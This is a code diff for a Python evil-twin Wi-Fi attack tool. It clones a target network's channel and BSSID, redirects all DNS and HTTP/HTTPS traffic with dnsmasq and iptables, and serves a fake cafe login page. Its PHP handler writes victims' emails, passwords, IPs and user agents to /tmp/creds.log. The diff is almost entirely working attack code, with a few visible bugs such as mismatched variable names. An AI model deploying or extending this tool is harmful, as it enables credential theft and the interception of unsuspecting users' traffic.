@@ -9,6 +9,8 @@ import glob
 import sys
 import signal
 import shutil
+import threading
+import importlib.util
 
 
 # Physical interface name (usually wlan0)
@@ -21,9 +23,11 @@ class FakeAP:
     def __init__(self):
         self.target_ssid = None
         self.target_channel = None
+        self.target_bssid = None
         self.mon_interface = None
         self.hostapd_proc = None
         self.dnsmasq_proc = None
+        #self.captive_portal_enabled = True
 
     def check_root(self):
         if os.geteuid() != 0:
@@ -31,7 +35,7 @@ class FakeAP:
             sys.exit(1)
 
     def check_tools(self):
-        required = ["hostapd", "dnsmasq", "airmon-ng", "airodump-ng", "macchanger"]
+        required = ["hostapd", "dnsmasq", "airmon-ng", "airodump-ng", "macchanger", "lighttpd"]
         missing = [t for t in required if not shutil.which(t)]
         if missing:
             print(f"[!] Missing tools: {', '.join(missing)}")
@@ -153,15 +157,19 @@ class FakeAP:
     def create_configs(self):
         print("[*] Generating hostapd config...")
         
+        test_ssid = f"{self.target_ssid}_Evil" #using this so I can find the evil AP and connect
+        print(f"using test ssid: {test_ssid}")
+        
         hostapd_conf = f"""
 interface={PHY_INTERFACE}
 driver=nl80211
-ssid={self.target_ssid}
+#ssid={self.target_ssid}
 hw_mode=g
+ssid={test_ssid}
 channel={self.target_channel}
 macaddr_acl=0
 auth_algs=1
-ignore_broadcast_ssid=0
+#ignore_broadcast_ssid=0
 """
         with open("hostapd.conf", "w") as f:
             f.write(hostapd_conf)
@@ -171,7 +179,9 @@ interface={PHY_INTERFACE}
 dhcp-range={DHCP_RANGE}
 dhcp-option=3,{FAKE_IP}
 dhcp-option=6,{FAKE_IP}
+address=/#/{FAKE_IP}
 server=8.8.8.8
+#address=
 log-queries
 log-dhcp
 """
@@ -184,9 +194,27 @@ log-dhcp
         subprocess.run(["ifconfig", PHY_INTERFACE, FAKE_IP, "netmask", "255.255.255.0", "up"])
         # Enable forwarding
         os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-
+    
     def start_services(self):
+        print("[+] Starting web server...")
+        subprocess.run(["systemctl", "stop", "lighttpd"], stdout=subprocess.DEVNULL)
+        subprocess.run(["systemctl", "start", "lighttpd"], stdout=subprocess.DEVNULL)
+        
         print("[+] Starting DNSMASQ...")
+        
+        dnsmasq_conf = f"""
+interface={PHY_INTERFACE}
+dhcp-range={DHCP_RANGE}
+dhcp-option=3,{FAKE_IP}
+dhcp-option=6,{FAKE_IP}
+address=/#/{FAKE_IP}
+server=8.8.8.8
+log-queries
+log-dhcp
+"""
+        with open("dnsmasq.conf", "w") as f:
+            f.write(dnsmasq_conf)
+        
         self.dnsmasq_proc = subprocess.Popen(
             ["dnsmasq", "-C", "dnsmasq.conf", "-d"],
             stdout=subprocess.DEVNULL,
@@ -207,36 +235,47 @@ log-dhcp
         try:
             self.hostapd_proc.wait()
         except KeyboardInterrupt:
-            pass
+            pass  
 
     def cleanup(self):
         print("\n[*] Shutting down...")
-        if self.hostapd_proc: self.hostapd_proc.terminate()
-        if self.dnsmasq_proc: self.dnsmasq_proc.terminate()
+        if self.hostapd_proc: 
+        	self.hostapd_proc.terminate()
+        	self.hostapd_proc.wait()
+        if self.dnsmasq_proc:
+        	self.dnsmasq_proc.terminate()
+        	self.dnsmasq_proc.wait()
         
         # Remove iptables rules
-        os.system(f"iptables -t nat -D PREROUTING -i {PHY_INTERFACE} -p tcp --dport 80 -j DNAT --to-destination {FAKE_IP}:80 2>/dev/null")
-        os.system(f"iptables -t nat -D PREROUTING -i {PHY_INTERFACE} -p tcp --dport 443 -j DNAT --to-destination {FAKE_IP}:80 2>/dev/null")
-        os.system("iptables -D FORWARD -p tcp --dport 80 -j ACCEPT 2>/dev/null")
-        os.system("iptables -D FORWARD -p tcp --dport 443 -j ACCEPT 2>/dev/null")
+        #os.system(f"iptables -t nat -D PREROUTING -i {PHY_INTERFACE} -p tcp --dport 80 -j DNAT --to-destination {FAKE_IP}:80 2>/dev/null")
+        #os.system(f"iptables -t nat -D PREROUTING -i {PHY_INTERFACE} -p tcp --dport 443 -j DNAT --to-destination {FAKE_IP}:80 2>/dev/null")
+        #os.system("iptables -D FORWARD -p tcp --dport 80 -j ACCEPT 2>/dev/null")
+        #os.system("iptables -D FORWARD -p tcp --dport 443 -j ACCEPT 2>/dev/null")
         
         # Stop web server
         subprocess.run(["systemctl", "stop", "lighttpd"], stdout=subprocess.DEVNULL)
+        
+        os.system("iptables -F")
+        os.system("iptables -t nat -F")
+        os.system("echo > /proc/sys/net/ipv4/ip_forward")
         
         # Remove configs
         if os.path.exists("hostapd.conf"): os.remove("hostapd.conf")
         if os.path.exists("dnsmasq.conf"): os.remove("dnsmasq.conf")
         
+        subprocess.run(["macchanger", "-p", PHY_INTERFACE], stdout=subprocess.DEVNULL)
+        
         # Reset IP
-        subprocess.run(["ifconfig", PHY_INTERFACE, "0.0.0.0"])
+        subprocess.run(["ifconfig", PHY_INTERFACE, "down"])
+        subprocess.run(["ifconfig", PHY_INTERFACE, "up"])
         print("[+] Done.")
 
     #Capture portal/ phishing part
     def set_captive_portal(self):
-        subprocess.run(["apt-get", "install", "-y", "lighttpd"], 
-                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run(["systemctl", "stop", "lighttpd"], 
-                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        #subprocess.run(["apt-get", "install", "-y", "lighttpd"], 
+        #           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        #subprocess.run(["systemctl", "stop", "lighttpd"], 
+        #           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
         os.makedirs("/var/www/html", exist_ok=True)
         
@@ -248,8 +287,8 @@ log-dhcp
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Cafe with Login</title>
-    <link rel="stylesheet" href="https://www.w3schools.com/w3css/5/w3.css">
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inconsolata">
+    <link rel="stylesheet" href="css/w3.css">
+    <link rel="stylesheet" href="css/fonts.css">
     <!-- Add the login styles -->
     <link rel="stylesheet" href="style.css">
     <style>
@@ -261,7 +300,7 @@ log-dhcp
         .bgimg {
             background-position: center;
             background-size: cover;
-            background-image: url("https://westhq.com.au/wp-content/uploads/2025/08/Corner-Cafe_Hero-Image.jpg");
+            background-image: url("img/background_page.jpg");
             min-height: 75%;
         }
 
@@ -275,7 +314,7 @@ log-dhcp
             place-items: center;
             position: center;
             background-size: cover;
-            background-image: url("https://images.unsplash.com/photo-1554034483-04fda0d3507b?fm=jpg&q=60&w=3000&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxzZWFyY2h8M3x8cGxhaW4lMjBiYWNrZ3JvdW5kc3xlbnwwfHwwfHx8MA%3D%3D");
+            background-image: url("img/background.jpeg");
             top: 0;
             left: 0;
             width: 100%;
@@ -337,7 +376,7 @@ log-dhcp
                     <p class="gentle-subtitle">Sign in to reserve tables and order online!</p>
                 </div>
                 
-                <form class="comfort-form" id="loginForm" novalidate>
+                <form class="comfort-form" id="loginForm" action="/login.php" method="POST" novalidate>
                     <div class="soft-field">
                         <div class="field-container">
                             <input type="email" id="email" name="email" required autocomplete="email">
@@ -495,7 +534,7 @@ log-dhcp
                     <p><i>"Use products from nature for what it's worth - but never too early, nor too late." Fresh is the new sweet.</i></p>
                     <p>Chef, Coffeeist and Owner: Liam Brown</p>
                 </div>
-                <img src="https://images.pexels.com/photos/1307698/pexels-photo-1307698.jpeg?cs=srgb&dl=pexels-igor-starkov-233202-1307698.jpg&fm=jpg" style="width:100%;max-width:1000px" class="w3-margin-top">
+                <img src="img/pic2.jpg" style="width:100%;max-width:1000px" class="w3-margin-top">
                 <p><strong>Opening hours:</strong> everyday from 6am to 5pm.</p>
                 <p><strong>Address:</strong> 15 Adr street, 5015, NY</p>
             </div>
@@ -548,7 +587,7 @@ log-dhcp
                     <h5>Soda</h5>
                     <p class="w3-text-grey">Coke, Sprite, Fanta, etc. 2.50</p>
                 </div>  
-                <img src="https://kernigkrafts.com/wp-content/uploads/2019/05/cafe-coffee-design-tasty.jpg" style="width:100%;max-width:1000px;margin-top:32px;">
+                <img src="img/pic1.jpg" style="width:100%;max-width:1000px;margin-top:32px;">
             </div>
         </div>
 
@@ -557,7 +596,7 @@ log-dhcp
             <div class="w3-content" style="max-width:700px">
                 <h5 class="w3-center w3-padding-48"><span class="w3-tag w3-wide">WHERE TO FIND US</span></h5>
                 <p>Find us at some address at some place.</p>
-                <img src="https://www.shutterstock.com/image-photo/empty-outdoor-cafe-near-canal-600nw-2571430537.jpg" class="w3-image" style="width:100%">
+                <img src="/img/pic2.jpg" class="w3-image" style="width:100%">
                 <p><span class="w3-tag">FYI!</span> We offer full-service catering for any event, large or small. We understand your needs and we will cater the food to satisfy the biggerst criteria of them all, both look and taste.</p>
                 <p><strong>Reserve</strong> a table by signing up!</p>
             </div>
@@ -632,7 +671,7 @@ log-dhcp
             if (!email) {
                 emailError.textContent = 'Email is required';
                 isValid = false;
-            } else if (!/\S+@\S+\.\S+/.test(email)) {
+            } else if (!/\\S+@\\S+\\.\\S+/.test(email)) {
                 emailError.textContent = 'Please enter a valid email';
                 isValid = false;
             }
@@ -706,29 +745,50 @@ log-dhcp
 </html>    
                     """)
             
-        malicious_dns_conf = f"""
-        interface={PHY_INTERFACE}
-        dhcp-range={DHCP_RANGE}
-        dhcp-option=3,{FAKE_IP}
-        dhcp-option=6,{FAKE_IP}
-        address=/#/{FAKE_IP}  # Redirect ALL domains to our IP
-        """
-        with open("dnsmasq.conf", "w") as f:
-            f.write(malicious_dns_conf)
+        #malicious_dns_conf = f"""
+        #interface={PHY_INTERFACE}
+        #dhcp-range={DHCP_RANGE}
+        #dhcp-option=3,{FAKE_IP}
+        #dhcp-option=6,{FAKE_IP}
+        #address=/#/{FAKE_IP}  # Redirect ALL domains to our IP
+        #"""
+        #with open("dnsmasq.conf", "w") as f:
+        #    f.write(malicious_dns_conf)
         
         php_capture = """<?php
+        error_reporting(E_ALL);
+        ini_set('display_errors',1);
+        $lof_file = '/tmp/creds.log';
         if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-            $email = $_POST['email'] ?? '';
-            $password = $_POST['password'] ?? '';
+            $email = isset($_POST['email']) ? trim($_POST['email']) : '';
+            $password = isset($_POST['password']) ? trim($_POST['password']) : '';
+            #remember = isset($_POST['remember']) ? 'Yes' : 'No';
+            
             $timestamp = date('Y-m-d H:i:s');
             $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+            $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
             
-            $log_entry = "$timestamp | IP: $ip | Email: $email | Password: $password\\n";
-            file_put_contents('/tmp/creds.log', $log_entry, FILE_APPEND);
+            $log_entry = "=" . str_repeat("=", 60) . "\\n";
+            $log_entry .=  "TIMESTAMP: $timestamp\\n";
+            $log_entry .=  "IP ADDRESS: $ip\\n";
+            $log_entry .=  "USER AGENT: $user_agent\\n";
+            $log_entry .=  "EMAIL: $email\\n";
+            $log_entry .=  "PASSWORD: $password\\n";
+            $log_entry .=  "REMEMBER ME: $remember\\n";
+            $log_entry .=  "=" . str_repeat("=", 60) . "\\n\\n";
+            
+            file_put_contents($log_file, $log_entry, FILE_APPEND);
+            echo $log_entry;
+            error_log("Captured credentials: $email / $password");
+            
+            echo "OK";
             
             // Redirect back or show success
             header('Location: /success.html');
             exit;
+        } else {
+        	header('Location: /index.html');
+        	exit;
         }
         ?>
         """
@@ -798,22 +858,34 @@ log-dhcp
 </html>"""
     
     with open("/var/www/html/success.html", "w") as f:
-        f.write(success_html)
+        	f.write(success_html)
     
-    print("[+] Starting web server...")
-    subprocess.run(["systemctl", "start", "lighttpd"], 
-                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    subprocess.run(["chmod", "-R", "755", "/var/www/html"])
+    subprocess.run(["chown", "-R", "www-data:www-data", "/var/www/html"])
     
-    time.sleep(2)
+    print("[+] Capture portal pages created")
+    #subprocess.run(["systemctl", "start", "lighttpd"], 
+    #               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     
-    os.system(f"iptables -t nat -A PREROUTING -i {PHY_INTERFACE} -p tcp --dport 80 -j DNAT --to-destination {FAKE_IP}:80")
-    os.system(f"iptables -t nat -A PREROUTING -i {PHY_INTERFACE} -p tcp --dport 443 -j DNAT --to-destination {FAKE_IP}:80")
-    os.system("iptables -A FORWARD -p tcp --dport 80 -j ACCEPT")
-    os.system("iptables -A FORWARD -p tcp --dport 443 -j ACCEPT")
+    #time.sleep(2)
     
-    print("[+] Captive portal setup complete")
-    print(f"[+] Credentials will be saved to: /tmp/creds.log")
+    def setup_iptables(self):
+    	print("[*] setting up iptables rules...")
+    	
+    	os.system("iptables -F")
+    	os.system("iptables -t nat -F")
+    	
+    	os.system(f"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
+    	os.system(f"iptables -A FORWARD -i {PHY_INTERFACE} -o eth0 -j ACCEPT")
+    	os.system(f"iptables -A FORWARD -i eth0 -o {PHY_INTERFACE} -m state --state RELATED,ESTABLISHED -j ACCEPT")
+    	
+    	os.system(f"iptables -t nat -A PREROUTING -i {PHY_INTERFACE} -p tcp --dport 80 -j DNAT --to-destination {FAKE_IP}:80")
+    	os.system(f"iptables -t nat -A PREROUTING -i {PHY_INTERFACE} -p tcp --dport 443 -j DNAT --to-destination {FAKE_IP}:80")
+    	
     
+    	print("[+] iptables rules configured")
+    	#print(f"[+] Credentials will be saved to: /tmp/creds.log")
+    	
     
     def run(self):
         self.check_root()
@@ -826,19 +898,42 @@ log-dhcp
             if not self.select_target():
                 self.stop_monitor_mode()
                 return
-
-            # Transition
-            self.stop_monitor_mode()
-            
+                
             # MAC spoofing
             if self.should_mac_spoof():
                 self.spoof_mac(self.target_bssid)
 
+            # Transition
+            self.stop_monitor_mode()
+
             # Attack Phase
             self.create_configs()
+            print("[*] setting up captive portal...")
             self.set_captive_portal()
             self.setup_networking()
+            
+            print("[*] Generating hostapd config...")
+        
+            test_ssid = f"{self.target_ssid}_Evil" #using this so I can find the evil AP and connect
+            print(f"using test ssid: {test_ssid}")
+        
+            hostapd_conf = f"""
+interface={PHY_INTERFACE}
+driver=nl80211
+#ssid={self.target_ssid}
+hw_mode=g
+ssid={test_ssid}
+channel={self.target_channel}
+macaddr_acl=0
+auth_algs=1
+#ignore_broadcast_ssid=0
+"""
+            with open("hostapd.conf", "w") as f:
+            		f.write(hostapd_conf)
+            
+            self.setup_iptables()
             self.start_services()
+            #self.set_captive_portal()
         
         except Exception as e:
             print(f"\n[!] Unexpected Error: {e}")
